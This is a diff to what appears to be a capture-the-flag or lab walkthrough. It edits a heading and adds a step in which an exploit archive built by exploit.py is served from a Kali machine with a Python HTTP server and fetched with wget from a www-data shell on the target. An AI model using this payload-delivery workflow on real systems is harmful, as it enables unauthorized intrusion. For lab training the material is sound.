@@ -1835,7 +1835,7 @@ print(f"Created exploit.zip with filename: {exploit_filename}")
 <br>
 </div>
 
-#### 4.3.2 Generating and Serving the Exploit
+#### 4.3.2 Generate and Serving the Exploit
 
 **Command:** `python3 exploit.py && python3 -m http.server 80`
 
@@ -1850,6 +1850,14 @@ print(f"Created exploit.zip with filename: {exploit_filename}")
 - `python3 -m http.server 80`
     - **Description:** Python SimpleHTTPModule.
     - **Purpose:** Starts a temporary web server on port 80 to host the files in the current directory for the target to download.
+<div align="center">
+<br>
+<br>
+</div>
+
+#### 4.3.3 Transfer the Exploit to the Target
+
+Once the server is running on your Kali machine, return to the **www-data** shell on the target and re-run the `wget` command.
 <div align="center">
 <br>
 <br>
